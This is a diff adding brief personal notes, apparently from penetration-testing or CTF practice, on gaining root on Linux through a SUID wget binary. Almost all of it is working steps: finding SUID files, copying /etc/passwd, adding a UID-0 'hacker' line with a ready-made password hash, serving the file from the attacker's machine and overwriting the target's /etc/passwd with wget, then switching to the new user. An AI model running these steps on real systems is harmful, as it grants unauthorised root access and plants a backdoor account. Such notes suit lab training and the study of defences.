@@ -1,0 +1,28 @@
+find / -perm -u=s -type f 2>/dev/null
+
+if wget is in the list of suid permissions you ccan do the following to get root:
+
+on the target machine:
+1.) cat /etc/passwd
+2.) copy the contents of the targets /etc/passwd
+
+on your machine:
+1.) make a file and name it password
+2.) paste the contents of the target machines /etc/passwd into your passwd file you just created
+3.) save the file
+4.) perl -le 'print crypt("pass123","abc123")'
+5.) copy the ouput of the command above
+6.) redit the file and add the following line on the bottom:
+	- hacker:as2XksB4AwhxU:0:0:User_like_root:/root:/bin/bash
+7.) save the passwd file
+8.) use a python server or nc to transfer the file over to the target machine
+
+back on the target machine:
+1.) go into /etc
+2.) wget http://yourtun0ip/passwd -O passwd
+3.) make sure you dont get a permission denied error
+4.) cat out passwd file and make sure that the user you created(in this case hacker) has been created
+5.) if the user you created is shown in the passwd file on the target machine:
+	- su hacker
+	- (PASS): pass123
+6.) You should now have root!!!
